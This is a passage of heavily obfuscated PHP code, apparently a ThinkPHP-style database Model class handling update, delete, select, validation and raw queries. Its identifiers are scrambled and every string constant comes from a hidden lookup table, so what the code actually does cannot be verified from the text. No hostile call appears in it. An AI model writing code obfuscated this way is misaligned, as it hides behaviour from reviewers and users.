{ $this->error = think_lang($ğñÛ¦–š[317]); return !1; } } $Ş¬«ÅÜó = $this->_facade($Ş¬«ÅÜó); $Ô¶×’›ú = $this->_parseOptions($Ô¶×’›ú); $‘¶ì“õı = $this->getPk(); if (!isset($Ô¶×’›ú[$ğñÛ¦–š[321]])) { if (isset($Ş¬«ÅÜó[$‘¶ì“õı])) { $Éƒ›ô÷[$‘¶ì“õı] = $Ş¬«ÅÜó[$‘¶ì“õı]; $Ô¶×’›ú[$ğñÛ¦–š[321]] = $Éƒ›ô÷; unset($Ş¬«ÅÜó[$‘¶ì“õı]); } else { $this->error = think_lang($ğñÛ¦–š[320]); return !1; } } if (is_array($Ô¶×’›ú[$ğñÛ¦–š[321]]) && isset($Ô¶×’›ú[$ğñÛ¦–š[321]][$‘¶ì“õı])) { $‘î„¨ßó = $Ô¶×’›ú[$ğñÛ¦–š[321]][$‘¶ì“õı]; } if (!1 === $this->_beforeUpdate($Ş¬«ÅÜó, $Ô¶×’›ú)) { return !1; } $»çİÉˆÃ = $this->db->update($Ş¬«ÅÜó, $Ô¶×’›ú); if (!1 !== $»çİÉˆÃ) { if (isset($‘î„¨ßó)) { $Ş¬«ÅÜó[$‘¶ì“õı] = $‘î„¨ßó; } $this->_afterUpdate($Ş¬«ÅÜó, $Ô¶×’›ú); } return $»çİÉˆÃ; } protected function _beforeUpdate(&$“–ı‘„œ, $·ãÁ·®Ã) { } protected function _afterUpdate($åØòàº, $›éÇ–) { } public function delete($£Ã»Úßë = array()) { $·™ÑŠ®­ =& $_SERVER[ò«¥Ê‡å]; if (empty($£Ã»Úßë) && empty($this->options[$·™ÑŠ®­[321]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Ÿú­€ÂĞ = $this->getPk(); if (is_numeric($£Ã»Úßë) || is_string($£Ã»Úßë)) { if (strpos($£Ã»Úßë, $·™ÑŠ®­[50])) { $„›‡ÉŠò[$Ÿú­€ÂĞ] = array($·™ÑŠ®­[322], $£Ã»Úßë); } else { $„›‡ÉŠò[$Ÿú­€ÂĞ] = $£Ã»Úßë; } $this->options[$·™ÑŠ®­[321]] = $„›‡ÉŠò; } $£Ã»Úßë = $this->_parseOptions(); if (is_array($£Ã»Úßë[$·™ÑŠ®­[321]]) && isset($£Ã»Úßë[$·™ÑŠ®­[321]][$Ÿú­€ÂĞ])) { $ü‚…ï¯Ÿ = $£Ã»Úßë[$·™ÑŠ®­[321]][$Ÿú­€ÂĞ]; } $‚š¡éù» = $this->db->delete($£Ã»Úßë); if (!1 !== $‚š¡éù») { $ëçÀıï” = array(); if (isset($ü‚…ï¯Ÿ)) { $ëçÀıï”[$Ÿú­€ÂĞ] = $ü‚…ï¯Ÿ; } $this->_after_delete($ëçÀıï”, $£Ã»Úßë); } return $‚š¡éù»; } protected function _after_delete($Ô¯«€œ®, $î‚‚ôò©) { } public function select($ÂÁÑ«ÒÃ = array()) { $²¼ ƒÔ’ =& $_SERVER[ò«¥Ê‡å]; if (is_string($ÂÁÑ«ÒÃ) || is_numeric($ÂÁÑ«ÒÃ)) { $¶¡‚„´Ä = $this->getPk(); if (strpos($ÂÁÑ«ÒÃ, $²¼ ƒÔ’[50])) { $™Ø¢ŒÉí[$¶¡‚„´Ä] = array($²¼ ƒÔ’[322], $ÂÁÑ«ÒÃ); } else { $™Ø¢ŒÉí[$¶¡‚„´Ä] = $ÂÁÑ«ÒÃ; } $this->options[$²¼ ƒÔ’[321]] = $™Ø¢ŒÉí; } elseif (!1 === $ÂÁÑ«ÒÃ) { $ÂÁÑ«ÒÃ = $this->_parseOptions(); return $²¼ ƒÔ’[323] . $this->db->buildSelectSql($ÂÁÑ«ÒÃ) . $²¼ ƒÔ’[324]; } $ÂÁÑ«ÒÃ = $this->_parseOptions(); $‘ÃÕù¥Ê = $this->db->select($ÂÁÑ«ÒÃ); if (!1 === $‘ÃÕù¥Ê) { return !1; } if (empty($‘ÃÕù¥Ê)) { return null; } $this->_afterSelect($‘ÃÕù¥Ê, $ÂÁÑ«ÒÃ); return $‘ÃÕù¥Ê; } protected function _afterSelect(&$Ø‡øŠš, $Èê·„Ã¼) { } public function buildSql($Á°ø°å = array()) { $¥…Ø”à =& $_SERVER[ò«¥Ê‡å]; $Á°ø°å = $this->_parseOptions($Á°ø°å); return $¥…Ø”à[323] . $this->db->buildSelectSql($Á°ø°å) . $¥…Ø”à[324]; } public function optionsValue($è”İÂòÊ = null) { if (is_null($è”İÂòÊ)) { return $this->options; } elseif (is_array($è”İÂòÊ)) { $this->options = array_merge($this->options, $è”İÂòÊ); } } protected function _parseOptions($ş¤Î‰š = array()) { $úÔòƒÛ› =& $_SERVER[ò«¥Ê‡å]; if (is_array($ş¤Î‰š)) { $ş¤Î‰š = array_merge($this->options, $ş¤Î‰š); } $this->options = array(); if (!isset($ş¤Î‰š[$úÔòƒÛ›[325]])) { $ş¤Î‰š[$úÔòƒÛ›[325]] = $this->getTableName(); $šä£æ÷¾ = $this->fields; } else { $šä£æ÷¾ = $this->getDbFields(); } if (!empty($ş¤Î‰š[$úÔòƒÛ›[326]])) { $ş¤Î‰š[$úÔòƒÛ›[325]] .= $úÔòƒÛ›[53] . $ş¤Î‰š[$úÔòƒÛ›[326]]; } $ş¤Î‰š[$úÔòƒÛ›[327]] = $this->name; if (isset($ş¤Î‰š[$úÔòƒÛ›[321]]) && is_array($ş¤Î‰š[$úÔòƒÛ›[321]]) && !empty($šä£æ÷¾) && !isset($ş¤Î‰š[$úÔòƒÛ›[328]]) && !isset($ş¤Î‰š[$úÔòƒÛ›[325]])) { foreach ($ş¤Î‰š[$úÔòƒÛ›[321]] as $ÃèÉ”˜ø => $Şú¨õÂ) { $ÃèÉ”˜ø = trim($ÃèÉ”˜ø); if (in_array($ÃèÉ”˜ø, $šä£æ÷¾, !0)) { if (is_scalar($Şú¨õÂ)) { $this->_parseType($ş¤Î‰š[$úÔòƒÛ›[321]], $ÃèÉ”˜ø); } } elseif (!is_numeric($ÃèÉ”˜ø) && $úÔòƒÛ›[11] != substr($ÃèÉ”˜ø, 0, 1) && !1 === strpos($ÃèÉ”˜ø, $úÔòƒÛ›[10]) && !1 === strpos($ÃèÉ”˜ø, $úÔòƒÛ›[306]) && !1 === strpos($ÃèÉ”˜ø, $úÔòƒÛ›[329]) && !1 === strpos($ÃèÉ”˜ø, $úÔòƒÛ›[330])) { unset($ş¤Î‰š[$úÔòƒÛ›[321]][$ÃèÉ”˜ø]); } } } $this->_options_filter($ş¤Î‰š); return $ş¤Î‰š; } protected function _options_filter(&$Ç±äùõ¤) { } protected function _parseType(&$ˆ¯É¿ñÊ, $Ñîó¸¿) { $ŠÖƒµ·¹ =& $_SERVER[ò«¥Ê‡å]; if (empty($this->options[$ŠÖƒµ·¹[331]][$ŠÖƒµ·¹[4] . $Ñîó¸¿])) { $ÔéïÃ¶· = strtolower($this->fields[$ŠÖƒµ·¹[298]][$Ñîó¸¿]); if (!1 !== strpos($ÔéïÃ¶·, $ŠÖƒµ·¹[332])) { } elseif (!1 === strpos($ÔéïÃ¶·, $ŠÖƒµ·¹[333]) && !1 !== strpos($ÔéïÃ¶·, $ŠÖƒµ·¹[334])) { $ˆ¯É¿ñÊ[$Ñîó¸¿] = intval($ˆ¯É¿ñÊ[$Ñîó¸¿]); } elseif (!1 !== strpos($ÔéïÃ¶·, $ŠÖƒµ·¹[335]) || !1 !== strpos($ÔéïÃ¶·, $ŠÖƒµ·¹[336])) { $ˆ¯É¿ñÊ[$Ñîó¸¿] = floatval($ˆ¯É¿ñÊ[$Ñîó¸¿]); } elseif (!1 !== strpos($ÔéïÃ¶·, $ŠÖƒµ·¹[337])) { $ˆ¯É¿ñÊ[$Ñîó¸¿] = (bool) $ˆ¯É¿ñÊ[$Ñîó¸¿]; } } } public function find($ã‡úÊøÂ = array()) { $—óÍ‡ú³ =& $_SERVER[ò«¥Ê‡å]; if (is_numeric($ã‡úÊøÂ) || is_string($ã‡úÊøÂ)) { $‰˜°ÕŞ§[$this->getPk()] = intval($ã‡úÊøÂ); $this->options[$—óÍ‡ú³[321]] = $‰˜°ÕŞ§; } $this->options[$—óÍ‡ú³[338]] = 1; $ã‡úÊøÂ = $this->_parseOptions(); $Åêéñ† = $this->db->select($ã‡úÊøÂ); if (!1 === $Åêéñ†) { return !1; } if (empty($Åêéñ†)) { return null; } $this->data = $Åêéñ†[0]; $this->_afterFind($this->data, $ã‡úÊøÂ); if (!empty($this->options[$—óÍ‡ú³[339]])) { return $this->returnResult($this->data, $this->options[$—óÍ‡ú³[339]]); } return $this->data; } protected function _afterFind(&$ç¦”šŠ•, $ÏÑªÄÚõ) { } protected function returnResult($ÙîìşÑú, $Ù¿’Ê÷Ÿ = '') { $Á¥ï±÷¾ =& $_SERVER[ò«¥Ê‡å]; if ($Ù¿’Ê÷Ÿ) { if (is_callable($Ù¿’Ê÷Ÿ)) { return call_user_func($Ù¿’Ê÷Ÿ, $ÙîìşÑú); } switch (strtolower($Ù¿’Ê÷Ÿ)) { case $Á¥ï±÷¾[340]: return json_encode($ÙîìşÑú); case $Á¥ï±÷¾[341]: return xml_encode($ÙîìşÑú); } } return $ÙîìşÑú; } public function parseFieldsMap($¾Í’¢õô, $¯ÛØã¨• = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ŞÜßØèÜ => $À•öÈóÚ) { if ($¯ÛØã¨• == 1) { if (isset($¾Í’¢õô[$À•öÈóÚ])) { $¾Í’¢õô[$ŞÜßØèÜ] = $¾Í’¢õô[$À•öÈóÚ]; unset($¾Í’¢õô[$À•öÈóÚ]); } } else { if (isset($¾Í’¢õô[$ŞÜßØèÜ])) { $¾Í’¢õô[$À•öÈóÚ] = $¾Í’¢õô[$ŞÜßØèÜ]; unset($¾Í’¢õô[$ŞÜßØèÜ]); } } } } return $¾Í’¢õô; } public function setField($à§ş‡û, $¼ŞÊœŸÃ = '') { if (is_array($à§ş‡û)) { $ŠıÌûèû = $à§ş‡û; } else { $ŠıÌûèû[$à§ş‡û] = $¼ŞÊœŸÃ; } return $this->save($ŠıÌûèû); } public function setAdd($ĞÔÄ“Ëî, $±ú»˜ğ = 1) { $¹Ë¸¤ã³ =& $_SERVER[ò«¥Ê‡å]; $§ÊÆØã = $ĞÔÄ“Ëî . $¹Ë¸¤ã³[342] . $±ú»˜ğ; if ($±ú»˜ğ < 0) { $§ÊÆØã = $ĞÔÄ“Ëî . $±ú»˜ğ; } return $this->setField($ĞÔÄ“Ëî, array($¹Ë¸¤ã³[343], $§ÊÆØã)); } public function getField($ˆ†úùí±, $’óÜƒœ› = null) { $Ì½Éé– =& $_SERVER[ò«¥Ê‡å]; $±Ø›‚ˆÄ[$Ì½Éé–[319]] = $ˆ†úùí±; $±Ø›‚ˆÄ = $this->_parseOptions($±Ø›‚ˆÄ); $ˆ†úùí± = trim($ˆ†úùí±); if (strpos($ˆ†úùí±, $Ì½Éé–[50])) { if (!isset($±Ø›‚ˆÄ[$Ì½Éé–[338]])) { $±Ø›‚ˆÄ[$Ì½Éé–[338]] = is_numeric($’óÜƒœ›) ? $’óÜƒœ› : $Ì½Éé–[12]; } $èµçÑãÏ = $this->db->select($±Ø›‚ˆÄ); if (!empty($èµçÑãÏ)) { $‹ü×¯ÍŸ = explode($Ì½Éé–[50], $ˆ†úùí±); $ˆ†úùí± = array_keys($èµçÑãÏ[0]); $ì¿å°Ñ¶ = array_shift($ˆ†úùí±); $ã¡ö´¹ = array_shift($ˆ†úùí±); $ûä‘ëÌÃ = array(); $Å’ô¨×Ú = count($‹ü×¯ÍŸ); foreach ($èµçÑãÏ as $™‚¬Å‰’) { $“Åó¢¥ = $™‚¬Å‰’[$ì¿å°Ñ¶]; if (2 == $Å’ô¨×Ú) { $ûä‘ëÌÃ[$“Åó¢¥] = $™‚¬Å‰’[$ã¡ö´¹]; } else { $ûä‘ëÌÃ[$“Åó¢¥] = is_string($’óÜƒœ›) ? implode($’óÜƒœ›, $™‚¬Å‰’) : $™‚¬Å‰’; } } return $ûä‘ëÌÃ; } } else { if (!0 !== $’óÜƒœ›) { $±Ø›‚ˆÄ[$Ì½Éé–[338]] = is_numeric($’óÜƒœ›) ? $’óÜƒœ› : 1; } if ($’óÜƒœ› === $Ì½Éé–[301]) { unset($±Ø›‚ˆÄ[$Ì½Éé–[338]]); } $™‚¬Å‰’ = $this->db->select($±Ø›‚ˆÄ); if (!empty($™‚¬Å‰’)) { if ($’óÜƒœ› === $Ì½Éé–[301]) { return reset($™‚¬Å‰’[0]); } if (!0 !== $’óÜƒœ› && 1 == $±Ø›‚ˆÄ[$Ì½Éé–[338]]) { return reset($™‚¬Å‰’[0]); } foreach ($™‚¬Å‰’ as $ó×Âø½”) { $Å’â•ù[] = $ó×Âø½”[$ˆ†úùí±]; } return $Å’â•ù; } } return null; } public function create($Œ–£›Ÿ = '', $ø¿Áíä = '') { $Ø”ê²‹š =& $_SERVER[ò«¥Ê‡å]; if (empty($Œ–£›Ÿ)) { $Œ–£›Ÿ = $_POST; } elseif (is_object($Œ–£›Ÿ)) { $Œ–£›Ÿ = get_object_vars($Œ–£›Ÿ); } if (empty($Œ–£›Ÿ) || !is_array($Œ–£›Ÿ)) { $this->error = think_lang($Ø”ê²‹š[317]); return !1; } $Œ–£›Ÿ = $this->parseFieldsMap($Œ–£›Ÿ, 0); $ø¿Áíä = $ø¿Áíä ? $ø¿Áíä : (!empty($Œ–£›Ÿ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Ø”ê²‹š[319]])) { $öª¢€çƒ = $this->options[$Ø”ê²‹š[319]]; unset($this->options[$Ø”ê²‹š[319]]); } elseif ($ø¿Áíä == THINK_MODEL_INSERT && isset($this->insertFields)) { $öª¢€çƒ = $this->insertFields; } elseif ($ø¿Áíä == THINK_MODEL_UPDATE && isset($this->updateFields)) { $öª¢€çƒ = $this->updateFields; } if (isset($öª¢€çƒ)) { if (is_string($öª¢€çƒ)) { $öª¢€çƒ = explode($Ø”ê²‹š[50], $öª¢€çƒ); } if (think_config($Ø”ê²‹š[344])) { $öª¢€çƒ[] = think_config($Ø”ê²‹š[345]); } foreach ($Œ–£›Ÿ as $Ú›ñîˆ¡ => $İ‚…‘á¯) { if (!in_array($Ú›ñîˆ¡, $öª¢€çƒ)) { unset($Œ–£›Ÿ[$Ú›ñîˆ¡]); } } } if (!$this->autoValidation($Œ–£›Ÿ, $ø¿Áíä)) { return !1; } if (!$this->autoCheckToken($Œ–£›Ÿ)) { $this->error = think_lang($Ø”ê²‹š[346]); return !1; } if ($this->autoCheckFields) { $öª¢€çƒ = $this->getDbFields(); foreach ($Œ–£›Ÿ as $Ú›ñîˆ¡ => $İ‚…‘á¯) { if (!in_array($Ú›ñîˆ¡, $öª¢€çƒ)) { unset($Œ–£›Ÿ[$Ú›ñîˆ¡]); } elseif (MAGIC_QUOTES_GPC && is_string($İ‚…‘á¯)) { $Œ–£›Ÿ[$Ú›ñîˆ¡] = stripslashes($İ‚…‘á¯); } } } $this->autoOperation($Œ–£›Ÿ, $ø¿Áíä); $this->data = $Œ–£›Ÿ; return $Œ–£›Ÿ; } public function autoCheckToken($ôÉ·º‡) { $ÒĞï¤ä„ =& $_SERVER[ò«¥Ê‡å]; if (isset($this->options[$ÒĞï¤ä„[347]]) && !$this->options[$ÒĞï¤ä„[347]]) { return !0; } if (think_config($ÒĞï¤ä„[344])) { $¥»çà€ = think_config($ÒĞï¤ä„[345]); if (!isset($ôÉ·º‡[$¥»çà€]) || Session::get($¥»çà€)) { return !1; } list($ßÃæÅ¶, $ºŞ¬«“‚) = explode($ÒĞï¤ä„[11], $ôÉ·º‡[$¥»çà€]); if ($ºŞ¬«“‚ && Session::get($¥»çà€ . $ÒĞï¤ä„[10] . $ßÃæÅ¶) === $ºŞ¬«“‚) { Session::remove($¥»çà€ . $ÒĞï¤ä„[10] . $ßÃæÅ¶); return !0; } if (think_config($ÒĞï¤ä„[348])) { Session::remove($¥»çà€ . $ÒĞï¤ä„[10] . $ßÃæÅ¶); } return !1; } return !0; } public function regex($¸­Ø‰Š, $Öâ›î˜) { $óˆ¬¶€© =& $_SERVER[ò«¥Ê‡å]; $©ö×ë„ = array($óˆ¬¶€©[349] => $óˆ¬¶€©[350], $óˆ¬¶€©[351] => $óˆ¬¶€©[352], $óˆ¬¶€©[353] => $óˆ¬¶€©[354], $óˆ¬¶€©[355] => $óˆ¬¶€©[356], $óˆ¬¶€©[357] => $óˆ¬¶€©[358], $óˆ¬¶€©[359] => $óˆ¬¶€©[360], $óˆ¬¶€©[361] => $óˆ¬¶€©[362], $óˆ¬¶€©[336] => $óˆ¬¶€©[363], $óˆ¬¶€©[364] => $óˆ¬¶€©[365]); if (isset($©ö×ë„[strtolower($Öâ›î˜)])) { $Öâ›î˜ = $©ö×ë„[strtolower($Öâ›î˜)]; } return preg_match($Öâ›î˜, $¸­Ø‰Š) === 1; } private function autoOperation(&$†öˆ€´–, $‡±ú¾»¡) { $”“Óñ“° =& $_SERVER[ò«¥Ê‡å]; if (!empty($this->options[$”“Óñ“°[366]])) { $ÏèÆñåÕ = $this->options[$”“Óñ“°[366]]; unset($this->options[$”“Óñ“°[366]]); } elseif (!empty($this->_auto)) { $ÏèÆñåÕ = $this->_auto; } if (isset($ÏèÆñåÕ)) { foreach ($ÏèÆñåÕ as $¡–ÂÚÙñ) { if (empty($¡–ÂÚÙñ[2])) { $¡–ÂÚÙñ[2] = THINK_MODEL_INSERT; } if ($‡±ú¾»¡ == $¡–ÂÚÙñ[2] || $¡–ÂÚÙñ[2] == THINK_MODEL_BOTH) { switch (trim($¡–ÂÚÙñ[3])) { case $”“Óñ“°[367]: case $”“Óñ“°[368]: $ºœíÜ¸Õ = isset($¡–ÂÚÙñ[4]) ? (array) $¡–ÂÚÙñ[4] : array(); if (isset($†öˆ€´–[$¡–ÂÚÙñ[0]])) { array_unshift($ºœíÜ¸Õ, $†öˆ€´–[$¡–ÂÚÙñ[0]]); } if ($”“Óñ“°[367] == $¡–ÂÚÙñ[3]) { $†öˆ€´–[$¡–ÂÚÙñ[0]] = call_user_func_array($¡–ÂÚÙñ[1], $ºœíÜ¸Õ); } else { $†öˆ€´–[$¡–ÂÚÙñ[0]] = call_user_func_array(array(&$this, $¡–ÂÚÙñ[1]), $ºœíÜ¸Õ); } break; case $”“Óñ“°[319]: $†öˆ€´–[$¡–ÂÚÙñ[0]] = $†öˆ€´–[$¡–ÂÚÙñ[1]]; break; case $”“Óñ“°[369]: if ($”“Óñ“°[12] === $†öˆ€´–[$¡–ÂÚÙñ[0]]) { unset($†öˆ€´–[$¡–ÂÚÙñ[0]]); } break; case $”“Óñ“°[370]: default: $†öˆ€´–[$¡–ÂÚÙñ[0]] = $¡–ÂÚÙñ[1]; } if (!1 === $†öˆ€´–[$¡–ÂÚÙñ[0]]) { unset($†öˆ€´–[$¡–ÂÚÙñ[0]]); } } } } return $†öˆ€´–; } protected function autoValidation($÷Í³Ççâ, $ì•Ş–®ˆ) { $üñÃ˜ =& $_SERVER[ò«¥Ê‡å]; if (!empty($this->options[$üñÃ˜[371]])) { $®“µßŠß = $this->options[$üñÃ˜[371]]; unset($this->options[$üñÃ˜[371]]); } elseif (!empty($this->_validate)) { $®“µßŠß = $this->_validate; } if (isset($®“µßŠß)) { if ($this->patchValidate) { $this->error = array(); } foreach ($®“µßŠß as $Èû‚ğõ => $¹¹Š‘ê‹) { if (empty($¹¹Š‘ê‹[5]) || $¹¹Š‘ê‹[5] == THINK_MODEL_BOTH || $¹¹Š‘ê‹[5] == $ì•Ş–®ˆ) { if (0 == strpos($¹¹Š‘ê‹[2], $üñÃ˜[372]) && strpos($¹¹Š‘ê‹[2], $üñÃ˜[373])) { $¹¹Š‘ê‹[2] = think_lang(substr($¹¹Š‘ê‹[2], 2, -1)); } $¹¹Š‘ê‹[3] = isset($¹¹Š‘ê‹[3]) ? $¹¹Š‘ê‹[3] : THINK_EXISTS_VALIDATE; $¹¹Š‘ê‹[4] = isset($¹¹Š‘ê‹[4]) ? $¹¹Š‘ê‹[4] : $üñÃ˜[374]; switch ($¹¹Š‘ê‹[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($÷Í³Ççâ, $¹¹Š‘ê‹)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($üñÃ˜[12] != trim($÷Í³Ççâ[$¹¹Š‘ê‹[0]])) { if (!1 === $this->_validationField($÷Í³Ççâ, $¹¹Š‘ê‹)) { return !1; } } break; default: if (isset($÷Í³Ççâ[$¹¹Š‘ê‹[0]])) { if (!1 === $this->_validationField($÷Í³Ççâ, $¹¹Š‘ê‹)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ËĞïê®–, $ÕíåòäÇ) { if (!1 === $this->_validationFieldItem($ËĞïê®–, $ÕíåòäÇ)) { if ($this->patchValidate) { $this->error[$ÕíåòäÇ[0]] = $ÕíåòäÇ[2]; } else { $this->error = $ÕíåòäÇ[2]; return !1; } } return; } protected function _validationFieldItem($€›šÔó, $Í¡¤Óü¾) { $ãûâçØ =& $_SERVER[ò«¥Ê‡å]; switch (strtolower(trim($Í¡¤Óü¾[4]))) { case $ãûâçØ[367]: case $ãûâçØ[368]: $ä´ŞÑ = isset($Í¡¤Óü¾[6]) ? (array) $Í¡¤Óü¾[6] : array(); if (is_string($Í¡¤Óü¾[0]) && strpos($Í¡¤Óü¾[0], $ãûâçØ[50])) { $Í¡¤Óü¾[0] = explode($ãûâçØ[50], $Í¡¤Óü¾[0]); } if (is_array($Í¡¤Óü¾[0])) { foreach ($Í¡¤Óü¾[0] as $¨²‰­”½) { $ú—ÛÁ¬[$¨²‰­”½] = $€›šÔó[$¨²‰­”½]; } array_unshift($ä´ŞÑ, $ú—ÛÁ¬); } else { array_unshift($ä´ŞÑ, $€›šÔó[$Í¡¤Óü¾[0]]); } if ($ãûâçØ[367] == $Í¡¤Óü¾[4]) { return call_user_func_array($Í¡¤Óü¾[1], $ä´ŞÑ); } else { return call_user_func_array(array(&$this, $Í¡¤Óü¾[1]), $ä´ŞÑ); } case $ãûâçØ[375]: return $€›šÔó[$Í¡¤Óü¾[0]] == $€›šÔó[$Í¡¤Óü¾[1]]; case $ãûâçØ[376]: if (is_string($Í¡¤Óü¾[0]) && strpos($Í¡¤Óü¾[0], $ãûâçØ[50])) { $Í¡¤Óü¾[0] = explode($ãûâçØ[50], $Í¡¤Óü¾[0]); } $–ŞÖì¤¯ = array(); if (is_array($Í¡¤Óü¾[0])) { foreach ($Í¡¤Óü¾[0] as $¨²‰­”½) { $–ŞÖì¤¯[$¨²‰­”½] = $€›šÔó[$¨²‰­”½]; } } else { $–ŞÖì¤¯[$Í¡¤Óü¾[0]] = $€›šÔó[$Í¡¤Óü¾[0]]; } if (!empty($€›šÔó[$this->getPk()])) { $–ŞÖì¤¯[$this->getPk()] = array($ãûâçØ[377], $€›šÔó[$this->getPk()]); } if ($this->where($–ŞÖì¤¯)->find()) { return !1; } return !0; default: return $this->check($€›šÔó[$Í¡¤Óü¾[0]], $Í¡¤Óü¾[1], $Í¡¤Óü¾[4]); } } public function check($åıë¬§³, $àÓÈ€ÌÊ, $¬Ö§š±¿ = "\x72\x65\x67\x65\x78") { $…˜Ô˜Ùë =& $_SERVER[ò«¥Ê‡å]; $¬Ö§š±¿ = strtolower(trim($¬Ö§š±¿)); switch ($¬Ö§š±¿) { case $…˜Ô˜Ùë[7]: case $…˜Ô˜Ùë[378]: $Ş¼ÊõÚü = is_array($àÓÈ€ÌÊ) ? $àÓÈ€ÌÊ : explode($…˜Ô˜Ùë[50], $àÓÈ€ÌÊ); return $¬Ö§š±¿ == $…˜Ô˜Ùë[7] ? in_array($åıë¬§³, $Ş¼ÊõÚü) : !in_array($åıë¬§³, $Ş¼ÊõÚü); case $…˜Ô˜Ùë[379]: case $…˜Ô˜Ùë[380]: if (is_array($àÓÈ€ÌÊ)) { $ŠšÑÀ¿í = $àÓÈ€ÌÊ[0]; $Æ«¥®Ãğ = $àÓÈ€ÌÊ[1]; } else { list($ŠšÑÀ¿í, $Æ«¥®Ãğ) = explode($…˜Ô˜Ùë[50], $àÓÈ€ÌÊ); } return $¬Ö§š±¿ == $…˜Ô˜Ùë[379] ? $åıë¬§³ >= $ŠšÑÀ¿í && $åıë¬§³ <= $Æ«¥®Ãğ : $åıë¬§³ < $ŠšÑÀ¿í || $åıë¬§³ > $Æ«¥®Ãğ; case $…˜Ô˜Ùë[381]: case $…˜Ô˜Ùë[382]: return $¬Ö§š±¿ == $…˜Ô˜Ùë[381] ? $åıë¬§³ == $àÓÈ€ÌÊ : $åıë¬§³ != $àÓÈ€ÌÊ; case $…˜Ô˜Ùë[383]: $Àâ«ÏğÆ = mb_strlen($åıë¬§³, $…˜Ô˜Ùë[384]); if (strpos($àÓÈ€ÌÊ, $…˜Ô˜Ùë[50])) { list($ŠšÑÀ¿í, $Æ«¥®Ãğ) = explode($…˜Ô˜Ùë[50], $àÓÈ€ÌÊ); return $Àâ«ÏğÆ >= $ŠšÑÀ¿í && $Àâ«ÏğÆ <= $Æ«¥®Ãğ; } else { return $Àâ«ÏğÆ == $àÓÈ€ÌÊ; } case $…˜Ô˜Ùë[385]: list($óûã¾à«, $Ö³× ¸) = explode($…˜Ô˜Ùë[50], $àÓÈ€ÌÊ); if (!is_numeric($óûã¾à«)) { $óûã¾à« = strtotime($óûã¾à«); } if (!is_numeric($Ö³× ¸)) { $Ö³× ¸ = strtotime($Ö³× ¸); } return NOW_TIME >= $óûã¾à« && NOW_TIME <= $Ö³× ¸; case $…˜Ô˜Ùë[386]: return in_array(get_client_ip(), explode($…˜Ô˜Ùë[50], $àÓÈ€ÌÊ)); case $…˜Ô˜Ùë[387]: return !in_array(get_client_ip(), explode($…˜Ô˜Ùë[50], $àÓÈ€ÌÊ)); case $…˜Ô˜Ùë[374]: default: return $this->regex($åıë¬§³, $àÓÈ€ÌÊ); } } public function query($¶–Àşó, $ƒ²•Í† = false) { $òò†åêÓ =& $_SERVER[ò«¥Ê‡å]; if (!is_bool($ƒ²•Í†) && !is_array($ƒ²•Í†)) { $ƒ²•Í† = func_get_args(); array_shift($ƒ²•Í†); } $¶–Àşó = str_replace(array($òò†åêÓ[248], $òò†åêÓ[388]), $òò†åêÓ[53], $¶–Àşó); $¶–Àşó = $this->parseSql($¶–Àşó, $ƒ²•Í†); return $this->db->query($¶–Àşó); } public function execute($çÑ¸£úÕ, $È³Ó•¶ = false) { if (!is_bool($È³Ó•¶) && !is_array($È³Ó•¶)) { $È³Ó•¶ = func_get_args(); array_shift($È³Ó•¶); } $çÑ¸£úÕ = $this->parseSql($çÑ¸£úÕ, $È³Ó•¶); return $this->db->execute($çÑ¸£úÕ); } protected function parseSql($¼Üù˜³, $‰»…ë) { $úæ‰ûğù =& $_SERVER[ò«¥Ê‡å]; if (!0 === $‰»…ë) { $²ÚŒ¤ = $this->_parseOptions(); $¼Üù˜³ = $this->db->parseSql($¼Üù˜³, $²ÚŒ¤); } elseif (is_array($‰»…ë)) { $‰»…ë = array_map(array($this->db, $úæ‰ûğù[389]), $‰»…ë); $¼Üù˜³ = vsprintf($¼Üù˜³, $‰»…ë); } else { $¼Üù˜³ = strtr($¼Üù˜³, array($úæ‰ûğù[390] => $this->getTableName(), $úæ‰ûğù[391] => think_config($úæ‰ûğù[290]))); } $this->db->setModel($this->name); return $¼Üù˜³; } public function db($æ™İ´½¦ = '', $ıÎÍúÉÔ = '', $€Ö÷¯ì = array()) { $ÖŞòÛ˜‹ =& $_SERVER[ò«¥Ê‡å]; if ($ÖŞòÛ˜‹[12] === $æ™İ´½¦ && $this->db) { return $this->db; } static $­£ê§¥é = array(); static $éîº€½¹ = array(); if (!isset($éîº€½¹[$æ™İ´½¦]) || isset($éîº€½¹[$æ™İ´½¦]) && $ıÎÍúÉÔ && $­£ê§¥é[$æ™İ´½¦] != $ıÎÍúÉÔ) { if (!empty($ıÎÍúÉÔ) && is_string($ıÎÍúÉÔ) && !1 === strpos($ıÎÍúÉÔ, $ÖŞòÛ˜‹[8])) { $ıÎÍúÉÔ = think_config($ıÎÍúÉÔ); } $æ™İ´½¦ = think_guid($ıÎÍúÉÔ); $éîº€½¹[$æ™İ´½¦] = Db::getInstance($ıÎÍúÉÔ); } elseif (NULL === $ıÎÍúÉÔ) { $éîº€½¹[$æ™İ´½¦]->close(); unset($éîº€½¹[$æ™İ´½¦]); return; } if (!empty($€Ö÷¯ì)) { if (is_string($€Ö÷¯ì)) { parse_str($€Ö÷¯ì, $€Ö÷¯ì); } foreach ($€Ö÷¯ì as $ªşö®© => $Ú©ÍÄ¶ù) { $this->setProperty($ªşö®©, $Ú©ÍÄ¶ù); } } $­£ê§¥é[$æ™İ´½¦] = $ıÎÍúÉÔ; $this->db = $éîº€½¹[$æ™İ´½¦]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Ú‹â„Ñˆ = get_class($this); if ($Ú‹â„Ñˆ == $_SERVER[ò«¥Ê‡å][392]) { return $this->name; } $this->name = substr($Ú‹â„Ñˆ, 0, -5); } return $this->name; } public function getTableName() { $€Ğêì‹İ =& $_SERVER[ò«¥Ê‡å]; if (empty($this->trueTableName)) { $î†ÛóÛ¶ = !empty($this->tablePrefix) ? $this->tablePrefix : $€Ğêì‹İ[12]; if (!empty($this->tableName)) { $î†ÛóÛ¶ .= $this->tableName; } else { $î†ÛóÛ¶ .= think_parse_name($this->name); } $this->trueTableName = strtolower($î†ÛóÛ¶); } return (!empty($this->dbName) ? $this->dbName . 